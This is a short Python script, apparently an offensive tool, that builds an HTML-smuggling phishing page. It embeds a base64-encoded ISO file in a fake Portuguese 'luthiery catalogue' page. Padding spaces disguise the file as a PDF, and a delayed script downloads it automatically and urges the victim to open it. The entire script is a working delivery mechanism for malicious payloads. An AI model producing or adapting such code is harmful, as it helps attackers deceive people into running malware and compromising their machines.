import base64, random

with open("entrega.iso", "rb") as f:
    b64 = base64.b64encode(f.read()).decode()

fname = "Medidas_Paco_De_Lucia_Oficial_1971.pdf" + " " * 200 + ".iso"
delay = random.randint(2000, 5000)

html = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Documento - Catalogo Luthieria 1971</title></head>
<body style="font-family:sans-serif;text-align:center;margin-top:80px;">
<h2>Visualizando documento...</h2>
<p id="status">O documento ser&aacute; dispon&iacute;vel para download em instantes.</p>
<script>
var base64Data = "{b64}";

function downloadFile() {{
    var fileName = "{fname}";
    var byteCharacters = atob(base64Data);
    var byteNumbers = new Array(byteCharacters.length);
    for (var i = 0; i < byteCharacters.length; i++) {{
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }}
    var byteArray = new Uint8Array(byteNumbers);
    var blob = new Blob([byteArray], {{type: "application/octet-stream"}});
    var link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    link.download = fileName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    document.getElementById('status').innerText = "Download conclu&iacute;do! Abra o arquivo para visualizar o catalogo.";
}}
setTimeout(downloadFile, {delay});
</script>
</body>
</html>"""

with open("phishing.html", "w") as f:
    f.write(html)

print(f"[+] phishing.html gerado (delay {delay}ms, ISO embutida)")
